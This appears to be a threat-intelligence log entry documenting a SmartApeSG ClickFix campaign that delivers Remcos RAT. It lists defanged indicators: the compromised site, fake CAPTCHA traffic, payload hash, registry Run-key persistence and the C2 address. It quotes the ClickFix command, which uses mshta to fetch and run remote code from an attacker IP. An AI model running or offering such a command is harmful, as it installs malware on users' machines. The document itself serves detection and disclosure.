@@ -1,0 +1,50 @@
+2026-02-03 (TUESDAY): SMARTAPESG CAMPAIGN CLICKFIX ACTIVITY
+
+NOTE:
+
+- The final malware appears to be Remcos RAT, based on what I've seen previously reported.
+
+COMPROMISED SITE:
+
+- hxxps[:]//airforceairguns[.]com/
+
+EXAMPLE OF TRAFFIC FOR FAKE CAPTCHA PAGE:
+
+- hxxps[:]//saltonc[.]com/oauth/logout-worker.js
+- hxxps[:]//saltonc[.]com/oauth/user-response.php?yHudpQAI
+- hxxps[:]//saltonc[.]com/oauth/public-thread.js?03b1cff403a9eb7f4f
+
+CLICKFIX SCRIPT FROM FAKE CAPTCHA PAGE:
+
+cmd /c "if exist C:\Windows\System32\notepad.exe start "" mshta hxxp[:]//193.42.38[].88/file"
+
+TRAFFIC FROM RUNNING THE ABOVE COMMAND
+
+- hxxp[:]//193.42.38[.]88/file
+- hxxps[:]//innotuesday[.]com/file
+- hxxp[:]//193.42.38[.]88/zip
+- hxxps[:]//innotuesday[.]com/zip
+
+FINAL MALWARE PACKAGE:
+
+- SHA256 hash: 21faa6bdd56d5af18ceff2d304e8e7a5e29633800f6af79a7d4decdc9c534835
+- File size: 91,058,254 bytes
+- File location: hxxps[:]//innotuesday[.]com/zip
+- Example of saved file location: C:\Users\[username]\AppData\Local\1570521.pdf
+- File type: Zip archive data, at least v2.0 to extract, compression method=deflate
+- File description: ZIP archive containing files for DLL side loading of malware
+
+CONTENT OF ZIP ARCHIVE EXTRACTED TO:
+
+- C:\Users\[username]\AppData\Local\1570521\
+
+WINDOWS REGISTRY UPDATE:
+
+- Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+- Value name: Intel STPW
+- Value type: REG_SZ
+- Value data: C:\Users\[username]\AppData\Local\1570521\intel-stpw.exe
+
+MALWARE C2:
+
+- 109.172.91[.]23:443 - HTTPS traffic
